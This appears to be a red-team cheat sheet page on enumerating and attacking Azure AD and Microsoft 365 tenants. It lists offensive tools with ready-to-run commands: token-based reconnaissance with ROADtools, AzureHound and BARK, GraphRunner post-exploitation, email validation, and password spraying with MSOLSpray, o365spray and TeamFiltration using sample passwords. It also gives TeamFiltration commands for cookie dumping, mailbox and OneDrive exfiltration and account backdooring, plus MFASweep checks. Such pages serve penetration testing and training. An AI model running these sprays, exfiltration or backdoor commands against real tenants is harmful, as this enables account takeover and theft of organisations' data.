# Azure AD - Enumerate

## Azure AD - Collectors

* [**Microsoft Portals**](https://msportals.io/) - Microsoft Administrator Sites
* [**ROADTool**](https://github.com/dirkjanm/ROADtools) - A collection of Azure AD tools for offensive and defensive security purposes 
    ```ps1
    roadrecon auth --access-token eyJ0eXA...
    roadrecon auth --prt-cookie <primary-refresh-token> -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2"
    roadrecon gather
    roadrecon gui
    ```
* [**BloodHoundAD/AzureHound**](https://github.com/BloodHoundAD/AzureHound) - Azure Data Exporter for BloodHound
    ```ps1
    ./azurehound --refresh-token <refresh-token> list --tenant "<target-tenant-id>" -o output.json
    ./azurehound -u "<username>@contoso.onmicrosoft.com" -p "<password>" list groups --tenant "<tenant>.onmicrosoft.com"
    ./azurehound -j "<jwt>" list users --tenant "<tenant>.onmicrosoft.com"
    ```
* [**BloodHoundAD/BARK**](https://github.com/BloodHoundAD/BARK) - BloodHound Attack Research Kit
    ```ps1
    . .\BARK.ps1
    $MyRefreshTokenRequest = Get-AZRefreshTokenWithUsernamePassword -username "user@contoso.onmicrosoft.com" -password "MyVeryCoolPassword" -TenantID "contoso.onmicrosoft.com"
    $MyMSGraphToken = Get-MSGraphTokenWithRefreshToken -RefreshToken $MyRefreshTokenRequest.refresh_token -TenantID "contoso.onmicrosoft.com"
    $MyAADUsers = Get-AllAzureADUsers -Token $MyMSGraphToken.access_token -ShowProgress
    ```
* [**dafthack/GraphRunner**](https://github.com/dafthack/GraphRunner) - A Post-exploitation Toolset for Interacting with the Microsoft Graph API
    ```ps1
    Invoke-GraphRecon -Tokens $tokens -PermissionEnum
    Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
    Invoke-DumpApps -Tokens $tokens
    Get-DynamicGroups -Tokens $tokens
    ```
* [**NetSPI/MicroBurst**](https://github.com/NetSPI/MicroBurst) - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping
    ```powershell
    PS C:> Import-Module .\MicroBurst.psm1
    PS C:> Import-Module .\Get-AzureDomainInfo.ps1
    PS C:> Get-AzureDomainInfo -folder MicroBurst -Verbose
    ```
* [**hausec/PowerZure**](https://github.com/hausec/PowerZure) - PowerShell framework to assess Azure security
    ```powershell
    Import-Module .\Powerzure.psd1
    Set-Subscription -Id [idgoeshere]
    Get-AzureTarget
    Get-AzureInTuneScript
    Show-AzureKeyVaultContent -All
    ```
* [**silverhack/monkey365**](https://github.com/silverhack/monkey365) - Microsoft 365, Azure subscriptions and Microsoft Entra ID security configuration reviews.
    ```powershell
    Get-ChildItem -Recurse c:\monkey365 | Unblock-File
    Import-Module C:\temp\monkey365
    Get-Help Invoke-Monkey365
    Get-Help Invoke-Monkey365 -Examples
    Get-Help Invoke-Monkey365 -Detailed
    ```
* [**Flangvik/TeamFiltration**](https://github.com/Flangvik/TeamFiltration) - TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts
    ```ps1
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --cookie-dump C:\\CookieData.txt --all
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --aad 
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --tokens C:\\OutputTokens.txt --onedrive --owa
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --teams --owa --owa-limit 5000
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --debug --exfil --onedrive
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --enum --validate-teams
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames C:\Clients\2021\FooBar\OSINT\Usernames.txt
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --backdoor
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --database
    ```
* [**Azure/StormSpotter**](https://github.com/Azure/Stormspotter) - :warning: This repository has not been updated recently - Azure Red Team tool for graphing Azure and Azure Active Directory objects
* [**nccgroup/Azucar**](https://github.com/nccgroup/azucar.git) - :warning: This repository has been archived - Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.
* [**FSecureLABS/Azurite Explorer**](https://github.com/FSecureLABS/Azurite) - :warning: This repository has not been updated recently - Enumeration and reconnaissance activities in the Microsoft Azure Cloud.
* [**cyberark/SkyArk**](https://github.com/cyberark/SkyArk) - :warning: This repository has not been updated recently - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins.   


## Azure AD - User Enumeration

### Enumerate Tenant Informations

* Federation with Azure AD or O365
    ```powershell
    Get-AADIntLoginInformation -UserName <USER>@<TENANT NAME>.onmicrosoft.com
    https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
    https://login.microsoftonline.com/getuserrealm.srf?login=root@<TENANT NAME>.onmicrosoft.com&xml=1
    ```
* Get the Tenant ID
    ```powershell
    Get-AADIntTenantID -Domain <TENANT NAME>.onmicrosoft.com
    https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration
    https://login.microsoftonline.com/<TENANT NAME>.onmicrosoft.com/.well-known/openid-configuration
    ```


### Enumerate from a Guest Account

```ps1
powerpwn recon --tenant {tenantId} --cache-path {path}
powerpwn dump -tenant {tenantId} --cache-path {path}
powerpwn gui --cache-path {path}
```


### Enumerate Emails

> By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.

* Validate email 
    ```powershell
    PS> C:\Python27\python.exe C:\Tools\o365creeper\o365creeper.py -f C:\Tools\emails.txt -o C:\Tools\validemails.txt
    admin@<TENANT NAME>.onmicrosoft.com   - VALID
    root@<TENANT NAME>.onmicrosoft.com    - INVALID
    test@<TENANT NAME>.onmicrosoft.com    - VALID
    contact@<TENANT NAME>.onmicrosoft.com - INVALID
    ```
* Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon
    ```powershell
    Install-Module MSOnline
    Install-Module AzureAD
    .\o365recon.ps1 -azure
    ```


### Password Spraying

The default lockout policy tolerates 10 failed attempts, then lock out an account for 60 seconds.

* [dafthack/MSOLSpray](https://github.com/dafthack/MSOLSpray)
    ```powershell
    PS> . C:\Tools\MSOLSpray\MSOLSpray.ps1
    PS> Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
    PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
    PS> Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!
    ```
* [0xZDH/o365spray](https://github.com/0xZDH/o365spray)
    ```powershell
    o365spray --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com
    ```
* [Flangvik/TeamFiltration](https://github.com/Flangvik/TeamFiltration) 
    ```powershell
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push --shuffle-users --shuffle-regions
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --spray --push-locked --months-only --exclude C:\Clients\2021\FooBar\Exclude_Emails.txt
    TeamFiltration.exe --outpath  C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --spray --passwords C:\Clients\2021\FooBar\Generic\Passwords.txt --time-window 13:00-22:00
    ```

## Azure Services Enumeration

### Enumerate Tenant Domains

Extract openly available information for the given tenant: [aadinternals.com/osint](https://aadinternals.com/osint/)

```ps1
Invoke-AADIntReconAsOutsider -DomainName <DOMAIN>
Invoke-AADIntReconAsOutsider -Domain "company.com" | Format-Table
Invoke-AADIntReconAsOutsider -UserName "user@company.com" | Format-Table
```


### Enumerate Azure Subdomains

```powershell
PS> . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1
PS> Invoke-EnumerateAzureSubDomains -Base <TENANT NAME> -Verbose
Subdomain Service
--------- -------
<TENANT NAME>.mail.protection.outlook.com Email
<TENANT NAME>.onmicrosoft.com Microsoft Hosted Domain
```

### Enumerate Services

* Using Az Powershell module
    ```powershell
    # Enumerate resources
    PS Az> Get-AzResource

    # List all VM's the user has access to
    PS Az> Get-AzVM 

    # Get all webapps
    PS Az> Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}

    # Get all function apps
    PS Az> Get-AzFunctionApp

    # List all storage accounts
    PS Az> Get-AzStorageAccount

    # List all keyvaults
    PS Az> Get-AzKeyVault

    # Get all application objects registered using the current tenant
    PS AzureAD> Get-AzureADApplication -All $true

    # Enumerate role assignments
    PS Az> Get-AzRoleAssignment -Scope /subscriptions/<SUBSCRIPTION-ID>/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/<VM-NAME>
    PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>.onmicrosoft.com

    # Check AppID Alternative Names/Display Name 
    PS AzureAD> Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq "<APP-ID>"} | fl
    ```

* Using az cli
    ```powershell
    PS> az vm list
    PS> az vm list --query "[].[name]" -o table
    PS> az webapp list
    PS> az functionapp list --query "[].[name]" -o table
    PS> az storage account list
    PS> az keyvault list
    ```


## Multi Factor Authentication

* [dafthack/MFASweep](https://github.com/dafthack/MFASweep) - A tool for checking if MFA is enabled on multiple Microsoft Services
```ps1
Import-Module .\MFASweep.ps1
Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020
Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 -Recon -IncludeADFS
```


## References

* [Bypassing conditional access by faking device compliance - @DrAzureAD - September 06, 2020](https://o365blog.com/post/mdm/)
* [CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course](https://github.com/0xJs/CARTP-cheatsheet/blob/main/Authenticated-enumeration.md)
* [Attacking Azure/Azure AD and introducing Powerzure - SpecterOps - Ryan Hausknecht - Jan 28, 2020](https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)